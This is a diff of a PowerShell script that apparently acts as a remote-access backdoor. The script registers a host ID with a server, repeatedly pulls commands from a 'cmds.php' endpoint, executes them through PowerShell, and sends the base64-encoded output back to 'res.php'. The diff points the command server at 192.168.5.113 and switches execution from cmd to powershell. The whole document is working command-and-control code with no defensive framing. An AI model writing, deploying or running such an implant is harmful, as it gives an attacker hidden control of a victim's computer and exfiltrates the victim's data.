@@ -18,13 +18,13 @@ $Hello = "$($a) $($id) $($b)"
 $EncHelloBytes = [System.Text.Encoding]::UTF8.GetBytes($Hello)
 $EncHello = [System.Convert]::ToBase64String($EncHelloBytes)
 
-$hello=(Invoke-WebRequest "https://127.0.0.1/res.php?res=$EncHello&id=$id")
+$hello=(Invoke-WebRequest "https://192.168.5.113/res.php?res=$EncHello&id=$id")
 
 while($true)
 {
 
 
-$Content=(Invoke-WebRequest "https://127.0.0.1/cmds.php?id=789&o=W").Content
+$Content=(Invoke-WebRequest "https://192.168.5.113/cmds.php?id=789&o=W").Content
 
 if ([string]::IsNullOrWhiteSpace($Content))
     {
@@ -53,13 +53,11 @@ ForEach ($line in $Content)
         continue
     }
 
-	$Output = cmd /c $cmd '2>&1'
+	$Output = powershell -c $cmd '2>&1'
 	$EncOutputBytes = [System.Text.Encoding]::UTF8.GetBytes($Output)
     $EncOutput = [System.Convert]::ToBase64String($EncOutputBytes)
 	
-$gimme=(Invoke-WebRequest "https://127.0.0.1/res.php?res=$EncOutput&id=$id")
+$gimme=(Invoke-WebRequest "https://192.168.5.113/res.php?res=$EncOutput&id=$id")
 }   
-
-
-
 }
+
